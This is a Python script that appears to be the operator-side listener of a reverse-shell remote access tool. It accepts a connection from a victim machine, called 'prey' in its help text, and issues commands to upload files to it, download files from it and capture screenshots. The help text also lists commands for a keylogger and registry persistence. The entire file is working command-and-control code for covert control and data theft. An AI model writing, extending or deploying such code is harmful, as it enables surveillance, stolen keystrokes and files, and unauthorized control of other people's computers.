import socket
from typing import Counter
import termcolor
import json
import os

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --  Quit Session with the prey
            clear                               --  Clear your screen
            cd <directory_name>                 --  Changes Directory on Target System
            inject *file_name*                  --  Upload File To The Prey
            download *file_name*                --  Download Files from the Prey
            keylog_start                        --  Start Keylogger
            keylog_dump                         --  Print all the Keystrokes
            keylog_stop                         --  Stop and self-destruct Keylogger File
            persistence *RegName* *file_name*   --  Create Persistence in Registry''', 'green'))
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'inject':
            upload_file(command[7:]) 
        elif command[:8] == 'download':
            download_file(command[:9])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1

        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(termcolor.colored('[+] Listening for incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('\n[+] Target Connected From: ' + str(ip), 'green'))
target_communication()